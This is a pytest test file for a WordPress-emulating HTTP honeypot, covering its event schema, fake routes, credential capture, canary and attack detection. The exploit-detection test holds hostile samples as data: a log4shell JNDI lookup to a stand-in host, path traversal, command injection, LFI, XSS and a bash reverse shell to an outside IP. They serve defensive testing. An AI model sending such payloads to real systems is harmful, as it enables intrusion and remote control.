"""Tests du honeypot HTTP (EPIC-2).

Le test central (``test_all_event_types_conform_to_schema``) valide chaque type
d'événement émis par le honeypot contre ``docs/event.schema.json`` : c'est la
garantie que « les logs == le schéma ». Les autres tests couvrent les routes
(US-08/US-28), la capture de credentials (US-09), la détection d'exploits
(US-10), de scanners (US-12) et le canary (US-11).
"""

import io
import json
from pathlib import Path

import pytest
from app.events import builder
from app.events.builder import EventSink, build_event, normalize_ipv4
from app.main import app
from app.middleware import exploit, scanner
from fastapi.testclient import TestClient
from jsonschema import Draft7Validator

SCHEMA_PATH = Path(__file__).resolve().parents[3] / "docs" / "event.schema.json"
# IPv4 publique de doc (RFC 5737) — respecte format: ipv4 du schéma.
TEST_IP = "203.0.113.7"


@pytest.fixture(scope="module")
def validator() -> Draft7Validator:
    schema = json.loads(SCHEMA_PATH.read_text(encoding="utf-8"))
    return Draft7Validator(schema, format_checker=Draft7Validator.FORMAT_CHECKER)


@pytest.fixture
def app_client(monkeypatch) -> tuple[TestClient, io.StringIO]:
    """TestClient + buffer capturant les événements émis (sink redirigé)."""
    buf = io.StringIO()
    monkeypatch.setattr(builder, "sink", EventSink(log_file=None, stream=buf))
    return TestClient(app, follow_redirects=False), buf


def _validate(validator: Draft7Validator, event: dict) -> None:
    errors = sorted(validator.iter_errors(event), key=lambda e: list(e.path))
    assert not errors, "\n".join(f"{list(e.path)}: {e.message}" for e in errors)


def _events(buf: io.StringIO) -> list[dict]:
    return [json.loads(line) for line in buf.getvalue().splitlines() if line.strip()]


# --- conformité au schéma (le test central) ---------------------------------
def test_all_event_types_conform_to_schema(validator: Draft7Validator) -> None:
    common = {"src_ip": TEST_IP, "src_port": 51234}
    events = [
        build_event(
            event_type="request",
            payload={"method": "GET", "path": "/wp-login.php", "user_agent": "curl/8", "headers": {}},
            **common,
        ),
        build_event(
            event_type="request",
            payload={"method": "GET", "path": "/p", "user_agent": "sqlmap/1.7", "is_scanner": True},
            classification=exploit.detect("/p", "id=1 UNION SELECT a FROM b", "", ""),
            **common,
        ),
        build_event(
            event_type="credential_attempt",
            payload={"method": "POST", "path": "/wp-login.php", "username": "admin", "password": "x"},
            **common,
        ),
        build_event(
            event_type="canary_triggered",
            payload={"method": "GET", "path": "/.env", "trap": "dotenv_canary"},
            classification={"category": "CANARY_TRIGGERED", "severity": "critical", "tags": ["dotenv_canary"]},
            **common,
        ),
    ]
    for event in events:
        _validate(validator, event)


def test_ipv4_normalization() -> None:
    assert normalize_ipv4("::ffff:192.0.2.10") == "192.0.2.10"
    assert normalize_ipv4("::1") == "127.0.0.1"
    assert normalize_ipv4("10.0.0.5") == "10.0.0.5"


def test_honeypot_host_matches_ssh_convention() -> None:
    event = build_event(event_type="request", src_ip=TEST_IP, payload={})
    # Même hostname que le SSH => le SIEM corrèle une seule machine.
    assert event["meta"]["honeypot_host"] == "prod-srv-01"
    assert event["service"] == "http"


# --- émulation WordPress (US-08) --------------------------------------------
def test_wordpress_routes(app_client: tuple[TestClient, io.StringIO]) -> None:
    client, _ = app_client
    r = client.get("/wp-login.php")
    assert r.status_code == 200
    assert "Powered by WordPress" in r.text
    assert r.headers["server"] == "Apache/2.4.57 (Debian)"
    assert r.headers["x-powered-by"] == "PHP/7.4.33"
    assert client.get("/wp-admin").status_code == 302
    assert "Disallow: /wp-admin/" in client.get("/robots.txt").text
    xmlrpc = client.get("/xmlrpc.php")
    assert xmlrpc.status_code == 405
    assert xmlrpc.text == "XML-RPC server accepts POST requests only."


def test_fastapi_internals_not_exposed(app_client: tuple[TestClient, io.StringIO]) -> None:
    # /openapi.json et /docs trahiraient FastAPI : ils doivent être 404.
    client, _ = app_client
    assert client.get("/openapi.json").status_code == 404
    assert client.get("/docs").status_code == 404


# --- routes supplémentaires (US-28) -----------------------------------------
def test_extra_routes(app_client: tuple[TestClient, io.StringIO]) -> None:
    client, _ = app_client
    assert "origin" in client.get("/.git/config").text
    assert "7.4.33" in client.get("/phpinfo.php").text
    assert client.get("/api/v1/users").json()[0]["role"] == "administrator"
    assert client.get("/console").status_code == 403
    assert "phpMyAdmin" in client.get("/phpmyadmin").text


# --- capture de credentials (US-09) -----------------------------------------
def test_credential_capture(app_client: tuple[TestClient, io.StringIO], validator: Draft7Validator) -> None:
    client, buf = app_client
    r = client.post(
        "/wp-login.php",
        data={"log": "admin", "pwd": "Hunter2"},
        headers={"x-forwarded-for": TEST_IP},
    )
    assert r.status_code == 200
    creds = [e for e in _events(buf) if e["event_type"] == "credential_attempt"]
    assert creds
    assert creds[0]["payload"]["username"] == "admin"
    assert creds[0]["payload"]["password"] == "Hunter2"
    assert creds[0]["src_ip"] == TEST_IP
    _validate(validator, creds[0])


# --- canary .env (US-11) ----------------------------------------------------
def test_canary_env(app_client: tuple[TestClient, io.StringIO], validator: Draft7Validator) -> None:
    client, buf = app_client
    r = client.get("/.env", headers={"x-forwarded-for": TEST_IP})
    assert "DB_PASSWORD" in r.text  # le faux .env décoy est bien servi
    canaries = [e for e in _events(buf) if e["event_type"] == "canary_triggered"]
    assert canaries
    assert canaries[0]["classification"]["severity"] == "critical"
    assert canaries[0]["payload"]["trap"] == "dotenv_canary"
    _validate(validator, canaries[0])


# --- détection d'exploits (US-10) -------------------------------------------
def test_exploit_detection() -> None:
    cases = {
        "sqli": ("/p", "id=1 UNION SELECT pwd FROM users", "", ""),
        "log4shell": ("/a", "x=${jndi:ldap://evil/x}", "", ""),
        "path_traversal": ("/x", "f=../../../../etc/passwd", "", ""),
        "rce": ("/c", "cmd=;cat /etc/hosts", "", ""),
        "lfi": ("/l", "p=php://filter/convert.base64-encode/resource=index", "", ""),
        "xss": ("/x", "q=<script>alert(1)</script>", "", ""),
        "reverse_shell": ("/r", "c=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "", ""),
    }
    for tag, parts in cases.items():
        cls = exploit.detect(*parts)
        assert cls is not None
        assert cls["category"] == "EXPLOIT_ATTEMPT"
        assert tag in cls["tags"]


def test_benign_request_no_exploit() -> None:
    assert exploit.detect("/wp-login.php", "", "", "Mozilla/5.0") is None


# --- détection de scanners (US-12) ------------------------------------------
def test_scanner_user_agents() -> None:
    assert scanner.is_scanner("sqlmap/1.7.2")
    assert scanner.is_scanner("Mozilla/5.00 (Nikto/2.5)")
    assert not scanner.is_scanner("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")


def test_webshell_detection_targets_uploads_only() -> None:
    assert scanner.looks_like_webshell("/uploads/shell.php")
    assert scanner.looks_like_webshell("/wp-content/uploads/evil.php")
    # Les .php légitimes du CMS ne doivent PAS être flaggés.
    assert not scanner.looks_like_webshell("/wp-login.php")
    assert not scanner.looks_like_webshell("/xmlrpc.php")


def test_request_event_flags_scanner_and_is_valid(
    app_client: tuple[TestClient, io.StringIO], validator: Draft7Validator
) -> None:
    client, buf = app_client
    client.get("/phpinfo.php", headers={"x-forwarded-for": TEST_IP, "user-agent": "sqlmap/1"})
    requests = [e for e in _events(buf) if e["event_type"] == "request"]
    assert requests
    assert requests[0]["payload"]["is_scanner"] is True
    _validate(validator, requests[0])
